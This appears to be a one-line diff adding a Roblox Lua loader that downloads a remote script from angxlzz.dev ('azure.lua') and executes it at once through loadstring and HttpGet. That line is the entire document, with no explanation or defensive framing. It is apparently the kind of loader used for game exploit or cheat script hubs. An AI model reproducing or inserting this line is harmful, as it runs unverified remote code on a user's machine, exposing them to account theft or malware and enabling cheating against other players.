@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://angxlzz.dev/azure.lua'))()
